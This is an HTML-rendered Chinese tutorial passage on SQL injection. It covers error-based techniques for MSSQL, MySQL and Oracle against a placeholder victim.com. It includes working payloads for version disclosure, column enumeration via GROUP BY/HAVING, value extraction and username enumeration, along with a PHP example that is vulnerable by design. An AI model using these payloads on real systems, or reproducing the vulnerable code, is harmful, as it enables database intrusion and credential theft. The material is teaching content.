&lt;h5 id=&#34;操纵参数&#34;&gt;&lt;a href=&#34;#操纵参数&#34; class=&#34;headerlink&#34; title=&#34;操纵参数&#34;&gt;&lt;/a&gt;操纵参数&lt;/h5&gt;&lt;p&gt;&lt;code&gt;http://sql.com/index.php?id=1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个&lt;code&gt;1&lt;/code&gt;就是参数，这个参数是可以控制的，可以用来测试，比如&lt;code&gt;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;先将&lt;code&gt;id&lt;/code&gt;改为一个不常见的参数，报错&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Warning: mysql_fetch_assoc &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; : supplied argument &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; a valid MySQL result resource &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; XXXX &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; line &lt;span class=&#34;token number&#34;&gt;34&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;加一个单引号&lt;code&gt;http://sql.com/index.php?id=1&#39;&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;You have an error &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; your &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; syntax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;check&lt;/span&gt; the manual that corresponds &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; your MySQL server version &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;right&lt;/span&gt; syntax &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt; near &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&#39;&#39;&lt;/span&gt; at line &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;还有一些其他的测试方法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;在Oracle和PostgreSQL中的漏洞。向Web服务器发送下面两个请求：
http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.php?category=bikes&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.php?category=bi&#39;||&#39;kes&lt;/span&gt;
在Microsoft &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; Server中与之等价的请求为：
http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.php?category=bikes&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.php?category=bi&#39;+&#39;kes&lt;/span&gt;
在MySQL中与之等价的请求为（请注意两个单引号之间的空格）：
http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.php?category=bikes&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.php?category=bi&#39;&#39;kes&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;信息工作流&#34;&gt;&lt;a href=&#34;#信息工作流&#34; class=&#34;headerlink&#34; title=&#34;信息工作流&#34;&gt;&lt;/a&gt;信息工作流&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/264b07c0f1804dc008b15f081b391718.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;数据库错误&#34;&gt;&lt;a href=&#34;#数据库错误&#34; class=&#34;headerlink&#34; title=&#34;数据库错误&#34;&gt;&lt;/a&gt;数据库错误&lt;/h4&gt;&lt;p&gt;就是上文提到的报错&lt;/p&gt;
&lt;h5 id=&#34;常见的sql漏洞&#34;&gt;&lt;a href=&#34;#常见的sql漏洞&#34; class=&#34;headerlink&#34; title=&#34;常见的sql漏洞&#34;&gt;&lt;/a&gt;常见的sql漏洞&lt;/h5&gt;&lt;h6 id=&#34;Sql-Server错误&#34;&gt;&lt;a href=&#34;#Sql-Server错误&#34; class=&#34;headerlink&#34; title=&#34;Sql Server错误&#34;&gt;&lt;/a&gt;Sql Server错误&lt;/h6&gt;&lt;p&gt;假设在victim.com应用中找到了一个名为showproducts.php的页面，页面脚本接收名为id 的参数并根据id参数的值显示单个商品：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproduct.aspx?id=2&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果将id参数的值修改成下列内容：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproduct.aspx?id=attacker&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;应用会返回类似于下列内容的错误：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Server Error &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/&#39;&#39; Application.
Invalid column name &#39;&lt;/span&gt;attacker&lt;span class=&#34;token string&#34;&gt;&#39;.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. Exception Details: System.Data.SqlClient.SqlException: Invalid column name &#39;&lt;/span&gt;attacker&#39;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在这个错误的基础上，可以猜想第一个示例中应用创建的SQL语句应如下：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; products &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; idproduct&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上述语句返回的结果集是idproduct字段等于2时的商品。如果注入一个非数字值，比如 attacker,那么最终发送给数据库服务器的SQL语句将如下所示：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; products &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; idproduct&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;attacker&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;这里mssql认为attacker不是一个数字，那么他就是个列名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;然后服务器从数据库中查找attacker列，没找到就返回了&lt;code&gt;Invalid column name &#39;attacker&#39;.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这里的attacker就可以做文章&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.aspx?category=bikes&#39; and l=0/@@ version;--&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;传入参数&lt;code&gt;&#39; and 1=0/@@version;--&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Syntax error converting the nvarchar &lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Microsoft SQL Server 2000 - 8.00.760 (Intel X86) Dec 17 2002 14:22:05 Copyright (c) 1988 - 2003 Microsoft Corporation Enterprise Edition on Windows NT 5.2 (Build 3790:)&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; a &lt;span class=&#34;token keyword&#34;&gt;column&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到这里的报错和上面是一个格式，错误信息展示了&lt;code&gt;@@version&lt;/code&gt;查询的内容&lt;/p&gt;
&lt;p&gt;原理：mssql的类型转换功能，&lt;code&gt;0/@@version&lt;/code&gt;除法运算，sql将这两个操作数都作为操作数，将&lt;code&gt;@@version&lt;/code&gt;当做数字解析，操作失败，将返回了这个错误。换成其他参数也是一个原理。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;还有一些技术可用于显示数据库执行的语句的信息，比如使用&lt;span class=&#34;token keyword&#34;&gt;having&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;：
http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.aspx?category=bikes&#39; having &#39;1&#39; =&#39;1&lt;/span&gt;
应用响应如下：
Server Error &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/&#39;&lt;/span&gt; Application&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;Column&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;products.productid&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; invalid &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; list because it &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; contained &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; an aggregate &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; there &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;no&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;GROUP&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; clause&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
Description: An unhandled exception occurred during the execution &lt;span class=&#34;token keyword&#34;&gt;of&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;current&lt;/span&gt; web request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt; Please review the stack trace &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; more information about the error &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; it originated &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; the code&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;having字句和group by 字句结合使用，在select中使用having过滤group by ，group by要求select语句选择的字段是某个聚合函数的结果，或者包含在group by 字句中，如果不满足，那么数据库返回一个错误，显示错误的第一列，该技术可以用来枚举表的列。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.aspx?category=bikes&#39; group by productid having &#39;1&#39; =&#39;1&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#products.name&lt;/span&gt;

http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.aspx?category=bikes&#39; group by productid,name having &#39;1&#39; =&#39;1&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#products.price&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后用上面提到类型转换错误检索列对应的值&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.aspx?category=bikes&#39; and 1=0/name;--&lt;/span&gt;

Server Error &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/&#39;&lt;/span&gt; Application&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
Syntax error converting the nvarchar &lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Claud Butler Olympus D2&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; a &lt;span class=&#34;token keyword&#34;&gt;column&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
Description: An unhandled exception occurred during the execution &lt;span class=&#34;token keyword&#34;&gt;of&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;current&lt;/span&gt; web request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt; Please review the stack trace &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; more information about the error &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; it originated &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; the code&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在身份验证机制中，可能枚举到用户名和密码的列，这样便可能登录有管理员权限的账号。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/logon.aspx?username=test&#39; and User not in (&#39;Admin&#39;) and l=0/User and &#39;1&#39; =&#39;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个payload将Admin用户排除，查找其他用户&lt;/p&gt;
&lt;p&gt;关闭ASP.NET中服务器向远程访问者显示详细错误信息&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-asp&#34; data-language=&#34;asp&#34;&gt;&lt;code class=&#34;language-asp&#34;&gt;web.config
&amp;lt;configuration&amp;gt;
&amp;lt;system.web&amp;gt;
&amp;lt;customErrors mode=&#34;Off&#34;/&amp;gt;
&amp;lt;/system.web&amp;gt;
&amp;lt;/configuration&amp;gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;设置错误重定向&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-asp&#34; data-language=&#34;asp&#34;&gt;&lt;code class=&#34;language-asp&#34;&gt;&amp;lt;configuration&amp;gt;
&amp;lt;system.web&amp;gt;
&amp;lt;customErrorsdefaultRedirect=&#34;Error.aspx&#34; mode=&#34;On&#34;〉
&amp;lt;errorstatusCode=&#34;403H redirect=&#39;*AccessDenied.aspxn/&amp;gt;
&amp;lt;errorstatusCode=&#34;404&#34; redirect=&#34;NotFound.aspx&#34;/&amp;gt;
&amp;lt;errorstatusCode=&#34;500&#34; redirect=&#34;InternalError.aspx&#34;/&amp;gt;
&amp;lt;/customErrors&amp;gt;
&amp;lt;/system.web&amp;gt;
&amp;lt;/configuration&amp;gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;Mysql错误&#34;&gt;&lt;a href=&#34;#Mysql错误&#34; class=&#34;headerlink&#34; title=&#34;Mysql错误&#34;&gt;&lt;/a&gt;Mysql错误&lt;/h6&gt;&lt;p&gt;常见错误代码&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Warning: mysql_fetch_array&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;: supplied argument &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; a valid MySQL result resource &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;www&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;victim&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;showproduct&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; line &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个报错是&lt;code&gt;mysql_fetch_array()&lt;/code&gt;产生的&lt;/p&gt;
&lt;p&gt;mysql一般用&lt;code&gt;mysql_error()&lt;/code&gt;来展示错误&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?php
//连接数据库 
mysql_connect(&#34;[database]&#34;, &#34;[user]&#34;, &#34;[password]&#34;) or
//检查错误，处理无法访问数据库的情况
die(&#34;Could not connect: &#34;.mysql_error());
//选择数据库
mysql_select_db(&#34;[database_name]&#34;);
//从GET请求中获取category值
$category = $_GET[&#34;category&#34;];
//创建并执行一条SQL语句
$result = mysql_query(&#34;SELECT * from products where category=&#39;$category&#39;&#34;)；
if (!$result) { //如果有任何错误
//检査错误并显示错误信息
die(&#34;&amp;lt;p&amp;gt;Error: &#39;.mysql_error().&#39;&amp;lt;/p&amp;gt;&#39;);
} else {
//遍历査询结果
while ($row = mysql_fetch_array($result.MYSQL_NUM))	{
printf (&#34;ID: %s Name: %s&#34;, $row[0], $row[1]);
}
//释放结果集
mysql_free_result($result);
?&amp;gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;传入单引号做参数，报错，这是mysql_error()产生的&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Error: You have an error &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; your &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; syntax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;check&lt;/span&gt; the manual that corresponds &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; your MySQL server version &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;right&lt;/span&gt; syntax &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt; near &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&#39; at line &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;传入一个不是字符串的（不在单引号内）作参数，便会被解析成列名，报错&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Error: Unknown &lt;span class=&#34;token keyword&#34;&gt;column&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;attacker&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;where clause&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;和mssql有异曲同工之妙&lt;/p&gt;
&lt;h6 id=&#34;Oracle错误&#34;&gt;&lt;a href=&#34;#Oracle错误&#34; class=&#34;headerlink&#34; title=&#34;Oracle错误&#34;&gt;&lt;/a&gt;Oracle错误&lt;/h6&gt;&lt;p&gt;常见错误&lt;/p&gt;
&lt;p&gt;执行了语法上不正确的SQL语句&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SQLException: ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;00933&lt;/span&gt;: &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; command &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; properly ended at oracle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;jdbc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbaccess&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;DBError&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;throwSqlException&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;DBError&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;java:&lt;span class=&#34;token number&#34;&gt;180&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; at oracle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;jdbc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ttc7&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;TTIoer&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;processError&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;TTIoer&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;java:&lt;span class=&#34;token number&#34;&gt;208&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oracle数据库检测到SQL语句中有一个使用单引号引起来的字符串未被正确结束，Oracle要求字符串必须使用单引号结束。注入一个单引号时会发现产生了下列错误：&lt;/p&gt;
